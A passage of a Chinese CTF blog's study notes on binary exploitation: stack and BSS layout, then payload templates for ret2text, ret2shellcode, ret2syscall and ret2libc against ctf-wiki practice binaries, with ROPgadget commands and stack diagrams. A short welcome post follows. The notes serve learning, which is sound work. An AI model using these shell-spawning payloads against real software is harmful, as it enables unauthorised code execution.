&#x3D; (1)0000 0000，全部被推出去</p></blockquote><hr><h2 id="浮点数转十六进制"><a href="#浮点数转十六进制" class="headerlink" title="浮点数转十六进制"></a>浮点数转十六进制</h2><p><a href="https://lostphp.com/hexconvert/">在线进制转换-IEE754浮点数16进制转换 (lostphp.com)</a></p><p>之后补算法类型工具。</p><hr><h2 id="大端法，小端法"><a href="#大端法，小端法" class="headerlink" title="大端法，小端法"></a>大端法，小端法</h2><p>x86架构大多使用小端法，即地址顺序由大到小。</p><hr><h2 id="栈-与-堆"><a href="#栈-与-堆" class="headerlink" title="栈 与 堆"></a>栈 与 堆</h2><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p><code>Stack</code></p><p>栈地址从高到低，运用栈寄存器ESP和EBP去限制初始化的栈空间大小。</p><p>SS为栈的段地址寄存器，SP为栈的偏移地址寄存器。</p><h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><p><code>heap</code></p><p>堆地址从低到高，大多为后申请的空间。</p><hr><h2 id="关于段地址的一些小内容"><a href="#关于段地址的一些小内容" class="headerlink" title="关于段地址的一些小内容"></a>关于段地址的一些小内容</h2><p>BSS段：BSS段（bss segment）通常是指用来存放程序中未初始化的或者初始值为0的全局变量的一块内存区域。BSS是英文Block Started by Symbol的简称。BSS段属于静态内存分配。</p><p>数据段：数据段（data segment）通常是指用来存放程序中已初始化的全局变量的一块内存区域。数据段属于静态内存分配。</p><h3 id="BSS段"><a href="#BSS段" class="headerlink" title="BSS段"></a>BSS段</h3><p>BSS段通常是指用来存放程序中未初始化的或者初始化为0的<strong>全局变量（Global variables）</strong>和<strong>静态变量（Static variables）</strong>的一块内存区域。特点是<strong>可读写的</strong>，在<strong>程序执行之前</strong>BSS段会自动清0。</p><p>可执行程序包括BSS段、数据段、代码段（也称文本段）。</p><p>UNIX下可使用size命令查看可执行文件的段大小信息。</p><hr><h2 id="关于ROP部分的部分理解"><a href="#关于ROP部分的部分理解" class="headerlink" title="关于ROP部分的部分理解"></a>关于ROP部分的部分理解</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>如</p><p><code>system(&quot;/bin/sh&quot;);</code></p><p>其对应汇编为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push binsh_addr<br>call system<br></code></pre></td></tr></table></figure><p>call system语句等价于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push [eip+5];syscall x86<br>jmp system<br></code></pre></td></tr></table></figure><p>call指令一般都是5字节长度，所以这里保存的是下一条指令的地址。</p><p>栈溢出控制rip&#x2F;eip，使IP直接指向，其实就相当于jmp system语句少了保存地址，所以我们要填一个返回地址给它。</p><p>（但是如果是调用system(“&#x2F;bin&#x2F;sh”)后就直接getshell了，返回地址是什么都无所谓，这种题目填0xdeadbeef来开小玩笑，后面才会用到）</p><p>以ctf-wiki上的ret2text题目为例，这种payload一般可以构造为：</p><p><code>payload = b&#39;a&#39;*offset + p32(target_addr)</code></p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>ret2shellcode类型题没有调用system函数，没有程序自带的后门，需要自己写（或用shellcraft等工具辅助构造）shellcode（指用于完成某个功能的汇编代码），并让程序<strong>执行</strong>这段shellcode（即所写入区域必须要有可读可写可执行权限，一般是BSS段），getshell。</p><p>以ctf-wiki上的ret2shellcode为例，这种payload一般可以构造为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = asm(shellcraft.sh())<br>buf2_addr = 0xaddress<br>payload = shellcode.ljust(<span class="hljs-number">112</span>, <span class="hljs-string">&#x27;A&#x27;</span>) + p32(buf2_addr)<br></code></pre></td></tr></table></figure><p>ljust方法将原字符串左对齐，并使用第二个参数填充至指定长度，并返回新的字符串。</p><p>ret2shellcode的原理相当于利用汇编语言写了一段system(“&#x2F;bin&#x2F;sh”)的函数并且通过被ret2到而执行。</p><p>shellcode的构造受架构、系统、操作系统位数影响，使用时应在exp前部加上对应的内容，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">context.binary = <span class="hljs-string">&#x27;文件位置&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, system = <span class="hljs-string">&#x27;linux&#x27;</span>)<span class="hljs-comment"># x86为i386</span><br></code></pre></td></tr></table></figure><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>ret2syscall是控制程序执行系统调用，getshell。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br>在电脑中，系统调用（英语：system call），指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务。系统调用提供用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态执行。如设备IO操作或者进程间通信。<br><br>Linux 在x86上的系统调用通过 int 80h 实现，用系统调用号来区分入口函数。操作系统实现系统调用的基本过程是：<br><br><span class="hljs-bullet">1.</span> 应用程序调用库函数（API）；<br><span class="hljs-bullet">2.</span> API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；<br><span class="hljs-bullet">3.</span> 内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；<br><span class="hljs-bullet">4.</span> 系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；<br><span class="hljs-bullet">5.</span> 中断处理函数返回到 API 中；<br><span class="hljs-bullet">6.</span> API 将 EAX 返回给应用程序。<br><br>应用程序调用系统调用的过程是：<br><br><span class="hljs-bullet">1.</span> 把系统调用的编号存入 EAX；<br><span class="hljs-bullet">2.</span> 把函数参数存入其它通用寄存器；<br><span class="hljs-bullet">3.</span> 触发 0x80 号中断（int 0x80）。<br></code></pre></td></tr></table></figure><p>以上内容摘自<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">系统调用 - 维基百科，自由的百科全书 (wikipedia.org)</a>。</p><p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell（x86）。</p><p><code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p><p>其中，该程序是 32 位，所以我们需要使得</p><ul><li>系统调用号，即 eax 应该为 0xb</li><li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>ret2syscall类型题是我们第一次使用ROPgadgets工具，因为本次我们需要控制这些寄存器的值。</p><p><strong>比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。</strong></p><p>ret2syscall类型题非常明显，多为静态编译，或者存在int 0x80（x86），或者存在syscall（x86_64），并且会非常常需要去搜找一些必要的gadget并控制加以利用。</p><p>所以首先我们需要寻找控制eax的gadgets</p><blockquote><p>ROPgadget –binary ret2syscall –only “pop|ret” | grep “eax”</p></blockquote><p>也可以用类似的语句来进行查询ebx等，但由于ebx-&gt;&#x2F;bin&#x2F;sh, ecx-&gt;0, edx-&gt;0，可以在查询一个寄存器的同时在表中找到相关的gadgets</p><blockquote><p>ROPgadget –binary ret2syscall –only “pop|ret” | grep “ebx”</p></blockquote><p>以ctf-wiki上的ret2syscall为例，可以选择</p><blockquote><p>0x0806eb90 : pop edx ; pop ecx ; pop ebx; ret</p></blockquote><p>ret2syscall类型题需要获得”&#x2F;bin&#x2F;sh”字符串对应地址，int 0x80的地址，那么还需要ROPgadget去查找到其位置</p><blockquote><p>ROPgadget –binary ret2syscall –string “int”</p></blockquote><p>以CTF-wiki上的例题为例，该题的payload可构造为：</p><p><code>payload = b&#39;a&#39; * offset + p32(pop_eax_ret) + p32(0xb) + p32(pop_edcbx_ret) + p32(0) + p32(0) + p32(binsh_addr) + p32(int_addr)</code></p><p>如果原题目中没有“&#x2F;bin&#x2F;sh”字符串，则应先调用eax为3的read函数，再去构造eax为0xb的system函数。注意，每当需要调用一个函数的时候，最后都应返回到一次“int 0x80”。</p><p><strong>注：公共syscall函数文档 <a href="https://x86.syscall.sh/">x86_syscall</a>、<a href="https://x64.syscall.sh/">x86_64_syscall</a>、<a href="https://arm.syscall.sh/">arm_syscall</a>、<a href="https://arm64.syscall.sh/">arm64_syscall</a></strong></p><blockquote><p>x86常见syscall及调用形式</p></blockquote><table><thead><tr><th align="center">SYSCALL NAME</th><th align="center">eax</th><th align="center">ebx</th><th align="center">ecx</th><th align="center">edx</th><th align="center">esi</th><th align="center">edi</th><th align="center">ebp</th></tr></thead><tbody><tr><td align="center">read</td><td align="center">3</td><td align="center">unsigned int fd</td><td align="center">char *buf</td><td align="center">size_t count</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">write</td><td align="center">4</td><td align="center">unsigned int fd</td><td align="center">const char *buf</td><td align="center">size_t count</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">open</td><td align="center">5</td><td align="center">const char *filename</td><td align="center">int flags</td><td align="center">umode_t mode</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">execve</td><td align="center">11(B)</td><td align="center">const char *filename</td><td align="center">const char *const *argv</td><td align="center">const char *const *envp</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">mprotect</td><td align="center">125(7D)</td><td align="center">unsigned long start</td><td align="center">size_t len</td><td align="center">unsigned long prot</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr></tbody></table><blockquote><p>x86_64常见syscall及调用形式</p></blockquote><table><thead><tr><th align="center">SYSCALL NAME</th><th align="center">rax</th><th align="center">rdi</th><th align="center">rsi</th><th align="center">rdx</th><th align="center">r10</th><th align="center">r8</th><th align="center">r9</th></tr></thead><tbody><tr><td align="center">read</td><td align="center">0</td><td align="center">unsigned int fd</td><td align="center">char *buf</td><td align="center">size_t count</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">write</td><td align="center">1</td><td align="center">unsigned int fd</td><td align="center">const char *buf</td><td align="center">size_t count</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">open</td><td align="center">2</td><td align="center">const char *filename</td><td align="center">int flags</td><td align="center">umode_t mode</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">execve</td><td align="center">59(3B)</td><td align="center">const char *filename</td><td align="center">const char *const *argv</td><td align="center">const char *const *envp</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">mprotect</td><td align="center">10(A)</td><td align="center">unsigned long start</td><td align="center">size_t len</td><td align="center">unsigned long prot</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr></tbody></table><blockquote><p>arm常见syscall及调用形式</p></blockquote><table><thead><tr><th align="center">SYSCALL NAME</th><th align="center">r7</th><th align="center">r0</th><th align="center">r1</th><th align="center">r2</th><th align="center">r3</th><th align="center">r4</th><th align="center">r5</th></tr></thead><tbody><tr><td align="center">read</td><td align="center">3</td><td align="center">unsigned int fd</td><td align="center">char *buf</td><td align="center">size_t count</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">write</td><td align="center">4</td><td align="center">unsigned int fd</td><td align="center">const char *buf</td><td align="center">size_t count</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">open</td><td align="center">5</td><td align="center">const char *filename</td><td align="center">int flags</td><td align="center">umode_t mode</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">execve</td><td align="center">11(B)</td><td align="center">const char *filename</td><td align="center">const char *const *argv</td><td align="center">const char *const *envp</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">mprotect</td><td align="center">125(7D)</td><td align="center">unsigned long start</td><td align="center">size_t len</td><td align="center">unsigned long prot</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr></tbody></table><blockquote><p>arm64常见syscall及调用形式</p></blockquote><table><thead><tr><th align="center">SYSCALL NAME</th><th align="center">x8</th><th align="center">x0</th><th align="center">x1</th><th align="center">x2</th><th align="center">x3</th><th align="center">x4</th><th align="center">x5</th></tr></thead><tbody><tr><td align="center">read</td><td align="center">63(3F)</td><td align="center">unsigned int fd</td><td align="center">char *buf</td><td align="center">size_t count</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">write</td><td align="center">64(40)</td><td align="center">unsigned int fd</td><td align="center">const char *buf</td><td align="center">size_t count</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">openat</td><td align="center">56(38)</td><td align="center">int dfd</td><td align="center">const char *filename</td><td align="center">int flags</td><td align="center">umode_t mode</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">execve</td><td align="center">11(B)</td><td align="center">const char *filename</td><td align="center">const char *const *argv</td><td align="center">const char *const *envp</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">mprotect</td><td align="center">226(E2)</td><td align="center">unsigned long start</td><td align="center">size_t len</td><td align="center">unsigned long prot</td><td align="center">-</td><td align="center">-</td><td align="center">-</td></tr></tbody></table><h3 id="libc是什么"><a href="#libc是什么" class="headerlink" title="libc是什么"></a>libc是什么</h3><p>libc为Linux下原来的标准ANSI C库。是基本的C语言函数库，包含了C语言最基本的库函数。</p><p>那么ret2libc类型题即是利用库函数和”&#x2F;bin&#x2F;sh”字段去getshell。</p><p>ret2libc类型题始终绕不开利用libc库plt表（中的函数）与”&#x2F;bin&#x2F;sh”去getshell的过程。</p><p>ret2libc类型题主要利用了动态链接，这是与ret2syscall不同的一点，静态链接大可能是ret2syscall。</p><h3 id="plt表与got表"><a href="#plt表与got表" class="headerlink" title="plt表与got表"></a>plt表与got表</h3><p>如当调用printf函数时，先去plt表和got表寻找printf函数的真实地址。plt表指向got表中的地址，got表指向glibc中的地址。</p><p>当首次调用函数时，过程为：plt-&gt;got-&gt;plt-&gt;公共plt-&gt;动态连接器_dl_runtime_resolve-&gt;找到函数地址。其中，_dl_runtime_resolve函数作用为查找函数地址并返回给got表。</p><p>之后调用时，过程为：plt-&gt;got-&gt;直接获取函数地址，因为此时got表已经记录函数地址。</p><p>[StormQ’s Blog (csstormq.github.io)](<a href="https://csstormq.github.io/blog/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AF%87%E4%B9%8B%E9%93%BE%E6%8E%A5%EF%BC%8814%EF%BC%89%EF%BC%9A.plt%E3%80%81.plt.got%E3%80%81.got">https://csstormq.github.io/blog/计算机系统篇之链接（14）：.plt、.plt.got、.got</a> 和 .got.plt section 之间的区别)</p><h3 id="ret2libc1类型题"><a href="#ret2libc1类型题" class="headerlink" title="ret2libc1类型题"></a>ret2libc1类型题</h3><p><em>有&#x2F;bin&#x2F;sh，有system函数，但system函数并没有直接调用&#x2F;bin&#x2F;sh字符串</em></p><p>此类型题源码可能为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;定义了system函数的头文件&gt;</span><span class="hljs-comment">//其一定在.plt表里</span></span><br><span class="hljs-type">char</span> binsh[]=<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">sys</span><span class="hljs-params">()</span> &#123;<br>system(<span class="hljs-string">&quot;echo ?&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> buf[<span class="hljs-number">16</span>];<br>    gets(buf);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>很明显，我们需要在BSS段中找到”&#x2F;bin&#x2F;sh”所在地址和system函数所在PLT表中的地址。即先填充数组栈空间，返回到PLT表中system函数的位置。这里注意，system函数调用时会有一个对应的返回地址，所以我们需要在调用system函数后首先任意填充(32&#x2F;64) &#x2F; 8 &#x3D; (4&#x2F;8)个字节的字符，再填充一个&#x2F;bin&#x2F;sh所在地址作为system函数的<strong>参数</strong>。</p><p>因此，此类型的32位payload编写一般为</p><blockquote><p>payload &#x3D; b’a’*offset + p32(system_plt) + p32(0xdeadbeef) + p32(binsh_addr)</p></blockquote><h3 id="ret2libc2类型题"><a href="#ret2libc2类型题" class="headerlink" title="ret2libc2类型题"></a>ret2libc2类型题</h3><p><em>无&#x2F;bin&#x2F;sh，有system函数</em></p><p>此类型题源码可能为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;定义了system函数的头文件&gt;</span></span><br><span class="hljs-comment">//char binsh[]=&quot;/bin/sh&quot;;</span><br><span class="hljs-type">char</span> save[<span class="hljs-number">100</span>];<br><span class="hljs-comment">//上述保存/bin/sh的内容不再存在，但提供了一个空的可读可写可执行区域可提供攻击者进行保存/bin/sh字符串</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sys</span><span class="hljs-params">()</span> &#123;<br>system(<span class="hljs-string">&quot;echo ?&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br><span class="hljs-type">int</span> buf[<span class="hljs-number">16</span>];<br><span class="hljs-comment">//gets(buf);scanf(&quot;%s&quot;, buf);这三种函数都明显地可以存在栈溢出行为</span><br>read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p> <strong>注意，如下两种解法都是需要后续再次自行sendline(“&#x2F;bin&#x2F;sh”)或自行输入”&#x2F;bin&#x2F;sh”的，原理均为返回到输入的函数并调用该函数，使其读入输入缓冲区中的下次输入内容。</strong></p><h4 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h4><p><strong>解法1：</strong>首先填充原程序通过read函数读的栈空间，先造成一次栈溢出，本次栈溢出的返回地址为read函数的地址，我们需要利用第二次的read函数去读下一次输入（*即下一次sendline的内容）并将其内容保存到一个可读可写（不需要可执行）段中的一个寄存器中，read函数也存在一个返回地址，这里首先填充函数的开头去重新执行整个程序，接下来填充read函数的三个参数，fd、读入数组变量所在首地址、最大读入数据量（<strong>如果是scanf函数或者gets函数则不需要fd、读入字量这两个参数的构造</strong>），最后是填充上返回到system的地址，再占用system函数的返回地址，最后填入system函数调用的地址。</p><p>以ctf-wiki上的ret2libc2为例（使用gets函数），该种payload在栈中部署形态为：</p><blockquote><p>该段内容选自<a href="https://blog.csdn.net/qq_41202237/article/details/105913529">好好说话之ret2libc2_hollk的博客-CSDN博客</a>，略作自己可以看得懂的修改。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">+---------------------------+<br>|           buf2            | buf2中的/bin/sh作为system_plt的参数<br>+---------------------------+<br>|        0xdeadbeef         | deadbeef作为system_plt的返回地址<br>+---------------------------+<br>|        system_plt         | 调用system_plt<br>+---------------------------+<br>|           buf2            | buf2地址作为gets的参数接收/bin/sh<br>+---------------------------+<br>|         pop+ebx           | gadget作为gets调用后的返回地址 <br>+---------------------------+<br>|         gets_plt          | 覆盖原ret返回位置，调用gets_plt<br>+---------------------------+<br>|           aaaa            | aaaa覆盖原saved ebp位置<br>+---------------------------+&lt;---ebp<br>|           aaaa            | aaaaaaaa占位填满栈空间<br>|           ....            |        .....<br>|           aaaa            | aaaaaaaa占位填满栈空间<br>|           aaaa            | aaaaaaaa占位填满栈空间<br>|           aaaa            | aaaaaaaa占位填满栈空间<br>|           aaaa            | aaaaaaaa占位填满栈空间<br>+---------------------------+&lt;--v4终止位置，ebp-0x64<br></code></pre></td></tr></table></figure><p><code>payload = flat([b&#39;a&#39;*112, gets_plt, pop_ebx_ret, buf2, system_plt, 0xdeadbeef, buf2])</code></p><p>若使用read函数，其payload可以写为</p><p><code>payload = &#39;a&#39;*112 + p32(read_plt) + p32(pop_ebx_ret) + p32(0) + p32(buf2) + p32(0x100) + p32(system_plt) + p32(0xdeadbeef) + p32(buf2)</code></p><p>pop_ebx_ret仅作为一个使指针上移的寄存器，弹给任何一个寄存器都没关系，只需要有返回。</p><blockquote><p>ROPgadget –binary ret2libc2 –only “pop|ret”</p></blockquote><p><strong>解法2：</strong>首先填充原程序通过read函数读的栈空间，先造成一次栈溢出，本次栈溢出的返回地址为read函数的地址，我们需要利用第二次的read函数去读下一次输入（*即下一次sendline的内容）并将其内容保存到一个可读可写（不需要可执行）段中的一个寄存器中，read函数也存在一个返回地址，此时我们让read函数直接指向system函数的地址，接下来填入read函数的三个参数（fd、数组变量首地址、最大读入字量）（<strong>如果是scanf函数或者gets函数则不需要fd、读入字量这两个参数的构造</strong>），最后填入system函数调用的变量地址。</p><p>以ctf-wiki上的ret2libc2为例（使用gets函数），该种payload在栈中部署形态（ROP链）为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs assembly">+---------------------------+<br>|           buf2            |使buf2中的/bin/sh作为system_plt的参数<br>+---------------------------+<br>|           buf2            |buf2地址作为gets的参数接收/bin/sh<br>+---------------------------+<br>|         system_plt        |调用system_plt<br>+---------------------------+<br>|          get_plt          |覆盖原ret返回位置，调用gets_plt<br>+---------------------------+<br>|           aaaa            |<br>|           ....            |<br>|           aaaa            |<br>|           aaaa            |<br>+---------------------------+&lt;--v4终止位置，ebp-0x64<br></code></pre></td></tr></table></figure><p><code>payload = &#39;a&#39;*112 + p32(gets_plt) + p32(system_plt) + p32(buf2) + p32(buf2)</code></p><p>若使用read函数，其payload可以写为</p><p><code>payload = flat([&#39;a&#39;*112, read_plt, system_plt, 0x00, buf2, 0x100, buf2])</code></p><h2 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h2><p><code>patchelf --set-interpreter ./glibc-all-in-one-master/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so --set-rpath ./glibc-all-in-one-master/libs/2.31-0ubuntu9.2_amd64 target_file</code></p><p><code>patchelf --set-interpreter ./glibc-all-in-one-master/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so --replace-needed libc.so.6 ./glibc-all-in-one-master/libs/2.31-0ubuntu9.2_amd64/libc.so.6 target_file</code></p><p><code>sudo ln ld-2.26.so /lib64/ld-2.26.so #然后设置解释器和libc，这样就能进行debug #设置解释器 patchelf --set-interpreter /lib64/ld-2.26.so ./gundam #设置libc patchelf --replace-needed libc.so.6 ~/2.26-0ubuntu2_amd64/libc-2.26.so ./gundam</code></p><p><code>p = process([&#39;/home/xuehuzhou/2.27-3ubuntu1_amd64/ld-2.27.so&#39;, &#39;./gundam&#39;], env=&#123;&quot;LD_PRELOAD&quot;:&#39;/home/xuehuzhou/2.27-3ubuntu1_amd64/libc.so.6&#39;&#125;)</code></p><p><code>cp -r ~/ctf2021/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/.debug/ ./debug</code></p><p><code>set debug-file-directory debug/</code></p><h2 id="glibc2-35内核态栈比glibc2-27内核态栈长0x30"><a href="#glibc2-35内核态栈比glibc2-27内核态栈长0x30" class="headerlink" title="glibc2.35内核态栈比glibc2.27内核态栈长0x30"></a>glibc2.35内核态栈比glibc2.27内核态栈长0x30</h2>]]></content>
    
    
    <categories>
      
      <category>CTFPWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
      <tag>pwn</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>This Place</title>
    <link href="/2022/11/02/This-Place/"/>
    <url>/2022/11/02/This-Place/</url>
    
    <content type="html"><![CDATA[<p>Welcome to my Blog Page!</p><p>欢迎来到我的博客空间！</p><span id="more"></span><p>This is the First blog written by me on this site.</p><p>这是我在本站写的第一个博客。</p><h1 id="FlRST-TIME-TO-DO"><a href="#FlRST-TIME-TO-DO" class="headerlink" title="FlRST TIME TO DO"></a>FlRST TIME TO DO</h1>]]></content>
    
    
    <categories>
      
      <category>Outset</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Outset</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
